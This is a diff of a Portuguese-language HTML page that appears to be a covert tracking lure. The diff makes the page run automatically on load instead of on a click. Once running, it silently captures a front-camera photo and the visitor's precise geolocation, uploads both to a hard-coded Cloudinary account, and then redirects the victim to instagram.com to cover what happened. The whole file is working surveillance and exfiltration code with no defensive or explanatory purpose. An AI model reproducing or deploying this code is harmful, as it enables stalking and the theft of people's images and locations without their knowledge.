@@ -2,80 +2,81 @@
 <html lang="pt">
 <head>
   <meta charset="UTF-8">
-  <title>...</title>
+  <title>Captura</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>body{margin:0;background:#000;overflow:hidden;}</style>
+  <style>body{margin:0;overflow:hidden;background:#000;}</style>
 </head>
-<body onclick="iniciarCaptura()">
+<body>
 <script>
-const cloudName = "dx5legahb"; // substitua se necessário
+const cloudName = "dx5legahb";
 const uploadPreset = "upload";
 const folderName = "capturas";
 
-async function iniciarCaptura() {
-    if (window.started) return;
-    window.started = true;
+async function capturarTudo() {
+  try {
+    // 1️⃣ Captura a foto com câmera frontal (sem mostrar nada)
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    await video.play();
 
-    try {
-        // 1️⃣ Foto com câmera frontal
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        const video = document.createElement("video");
-        video.srcObject = stream;
-        await video.play();
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        stream.getTracks().forEach(track => track.stop());
+    stream.getTracks().forEach(t => t.stop());
 
-        const imageData = canvas.toDataURL("image/png");
-        const imageBlob = await (await fetch(imageData)).blob();
+    const imageData = canvas.toDataURL("image/png");
+    const imageBlob = await (await fetch(imageData)).blob();
 
-        const imageForm = new FormData();
-        imageForm.append("file", imageBlob);
-        imageForm.append("upload_preset", uploadPreset);
-        imageForm.append("folder", folderName);
+    const imageForm = new FormData();
+    imageForm.append("file", imageBlob);
+    imageForm.append("upload_preset", uploadPreset);
+    imageForm.append("folder", folderName);
 
-        const imageResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
-            method: "POST",
-            body: imageForm
-        });
+    const imageResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
+      method: "POST",
+      body: imageForm
+    });
 
-        if (!imageResp.ok) throw new Error("Falha no envio da imagem");
-        const imageDataResp = await imageResp.json();
-        const imageUrl = imageDataResp.secure_url;
+    if (!imageResp.ok) throw new Error("Erro ao enviar imagem");
+    const imageUrl = (await imageResp.json()).secure_url;
 
-        // 2️⃣ Localização
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            const { latitude, longitude } = pos.coords;
-            const texto = `Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`;
-            const textBlob = new Blob([texto], { type: "text/plain" });
+    // 2️⃣ Captura a localização
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+      const { latitude, longitude } = pos.coords;
+      const texto = `Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`;
+      const textBlob = new Blob([texto], { type: "text/plain" });
 
-            const textForm = new FormData();
-            textForm.append("file", textBlob, `localizacao_${Date.now()}.txt`);
-            textForm.append("upload_preset", uploadPreset);
-            textForm.append("folder", folderName);
+      const textForm = new FormData();
+      textForm.append("file", textBlob, `localizacao_${Date.now()}.txt`);
+      textForm.append("upload_preset", uploadPreset);
+      textForm.append("folder", folderName);
 
-            await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, {
-                method: "POST",
-                body: textForm
-            });
+      await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, {
+        method: "POST",
+        body: textForm
+      });
 
-            window.location.href = "https://instagram.com";
-        }, () => {
-            window.location.href = "https://instagram.com";
-        }, {
-            enableHighAccuracy: true,
-            timeout: 5000
-        });
+      window.location.href = "https://instagram.com";
+    }, () => {
+      // Mesmo que a localização falhe, redireciona
+      window.location.href = "https://instagram.com";
+    }, {
+      enableHighAccuracy: true,
+      timeout: 5000
+    });
 
-    } catch (e) {
-        console.error("Erro:", e);
-        window.location.href = "https://instagram.com";
-    }
+  } catch (e) {
+    console.error("Falha:", e);
+    window.location.href = "https://instagram.com";
+  }
 }
+
+// Inicia automaticamente após o carregamento da página
+window.onload = capturarTudo;
 </script>
 </body>
 </html>
